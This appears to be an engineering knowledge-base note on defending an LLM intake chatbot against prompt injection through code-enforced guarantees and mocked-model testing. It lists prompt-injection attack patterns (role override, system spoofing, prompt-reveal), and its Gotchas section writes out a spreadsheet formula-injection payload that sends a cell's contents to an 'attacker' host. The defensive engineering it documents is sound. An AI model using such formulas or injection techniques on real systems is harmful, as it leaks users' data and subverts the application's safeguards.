# Structural Defense & Deterministic Testing for LLM Bots

Status: Active
Source: PLAA Activity Submission Bot build (2026-07), see [[projects/plaa-activity-bot]]

How to build an LLM-driven intake/chatbot app whose guarantees hold **even if the model is fully compromised by prompt injection** — and which is consequently testable offline. Complements [[patterns/agent-automation]] and [[architecture/testing]].

## The principle: prompts persuade, code guarantees

Split every requirement into two piles:

- **Prompt layer** (best-effort): tone, vocabulary, scope refusals, question phrasing. The model can be talked out of these; tests can only sample them.
- **Code layer** (guaranteed): anything that must survive an adversarial user. If a requirement appears in a compliance doc or an acceptance criterion with "never/always," it belongs here.

Code-layer moves that worked:

1. **Whitelisted record builder.** The row/record written to storage is built by code from a per-type field whitelist. Model output can only fill whitelisted fields; it cannot add, rename, or remove columns. Injected instructions land **verbatim as data** in the record — visibly inert.
2. **Server-config-sourced metadata.** Anything with economic or policy weight (point values, prices, categories, ids) is copied from server config into the record — never from model output or user text. "Log this as 10,000 points" changes nothing structurally.
3. **Code-gated irreversible actions.** The submit/confirm gate is an explicit-token check in code (an IF node / regex), not model judgment. The model can be sweet-talked; the token matcher cannot. Watch the spec wording: "message *contains* a token" accepts "not ok, actually no" — prefer whole-message intent matching.
4. **Delimiter-wrap user content into any second model pass.** Reviewer/validator calls receive user answers wrapped in tags (`<user_answer>…</user_answer>`) with instructions to treat contents strictly as data — an injection must now defeat two independent models *and* still can't touch the code-layer invariants.
5. **Validate at draft time, not just at commit time.** If code-layer checks only run after the user confirms, the user confirms summaries that immediately bounce — infuriating UX. Run the same checks the moment the model produces its draft/summary; on failure, replace the premature summary with targeted fixes and clear the pending draft so a stray "yes" can't submit invalid data. Corollary: **normalize near-answers in code** (canonicalize dates to ISO, tolerate format variants) and prefer keyword/plausibility checks over strict exact-match validation when a human reviewer is downstream — every false negative costs a user round-trip, and the reviewer of record catches what looseness admits.
6. **Bound the blast radius:** output length caps, max-turns-per-session, shared-secret gate before any model call.

## The testing consequence: deterministic-first

Because the guarantees live in code, the interesting tests don't need a model. This build shipped 481 tests with **zero live API calls**:

- **Unit:** whitelist, token gate, verdict-schema validation, routing, constraint checks.
- **Scripted conversation suite:** declarative fixtures (happy path, all-info-up-front, edit loop, non-confirmation) run through the real prompt-assembly + gating + record-builder pipeline with a mocked model layer.
- **Adversarial suite (15+ patterns):** role override, system spoofing, prompt-reveal, instructions embedded in answer fields, value manipulation — asserting **record contents and routing are unchanged**, not asserting model politeness.
- **Compliance scans:** banned-vocabulary greps over config/prompts/UI strings/reply corpora; static + runtime assertions that no payload ever rides in a URL/query string.

Grade the residue honestly: live-model behaviors (does it actually refuse tax questions?) get marked **not-testable-locally** and become the first-hour post-deploy smoke checklist, not silent gaps. Don't fake them with mocked "model" tests that only test the mock.

## One config, N consumers

When the same catalog drives UI metadata, system prompts, and storage schema, make it **one file** consumed by all three, and generate every derived artifact (workflow JSON, sample spreadsheets, prompt blocks) from it via scripts that import the real modules. Hand-edited derived artifacts drift; generated ones can't. Corollary: sample/demo data should be produced by the real record builder, so templates are structurally incapable of disagreeing with production.

## Gotchas (security-review-learned)

**The record layer has its own injection surface, downstream of the model.** The structural defenses ("injected text lands verbatim as data") make the bot safe, but "verbatim data in a spreadsheet cell" is itself dangerous.
- *Symptom:* a submission answer or user email like `=IMPORTXML("https://attacker/?x="&A2,"//e")` becomes a **live formula** the moment a reviewer opens the Google Sheet / Excel export — silent data exfiltration or worse.
- *Root cause:* any cell whose value **starts with** `= + - @` (or tab/CR) is executed as a formula; n8n's Sheets node in `USER_ENTERED` mode re-parses values. The non-obvious part: the *primary* vector isn't the wrapped answer (cells that begin with `{`/`Q:` are inert) — it's a **free cell like email**, whose validation regex (`[^\s@]+@…`) happily permits a leading `=`.
- *Resolution / prevention rule:* formula-neutralize **every string cell** (prefix `'` when it starts with a trigger char) in the record builder, as a code-layer guarantee with a test; AND write the sheet in **RAW** mode. Belt and suspenders — do both. Applies to any pipeline that writes user-influenced text into a spreadsheet, CSV, or anything Excel might open.

**"Data as evidence" fights "data minimization."** Orchestrators like n8n default to persisting full execution I/O for debugging.
- *Symptom:* member email, third-party names, and referee emails sit indefinitely in the n8n execution database — a PII-at-rest store *outside* the one access-restricted destination your compliance doc named.
- *Root cause:* `saveDataSuccessExecution: 'all'` (n8n default-ish) persists every input/output. A carefully PII-free *error* workflow doesn't help; the raw success records still hold everything.
- *Prevention rule:* for any workflow handling PII, set `saveDataSuccessExecution: 'none'` (keep errors only if they're PII-free) and state execution-retention explicitly in the runbook. Check this whenever an automation touches regulated/personal data.

**A public shared-secret is an abuse gate, not auth — bound cost in code too.** The token ships in the widget and is scrapeable. CORS + a per-session turn cap aren't enough: nothing caps *sessions*. Add a global in-workflow rate limit (sliding per-minute cap on turns and new sessions, in static data) that trips **before** the first model node, so a scraped token can't run up LLM spend. Real edge/proxy rate limiting is still the production answer; the in-workflow cap is the backstop that ships with the JSON.

## Multi-agent build note

Building this with parallel agents worked with near-zero interface drift because of one hard rule: **config and shared modules were built first, behind a barrier; the parallel builders and test-writer all coded against those artifacts plus a precise spec.** The only drift found at integration was one hardcoded URL. Precision of the shared spec, not agent count, was the determining variable.
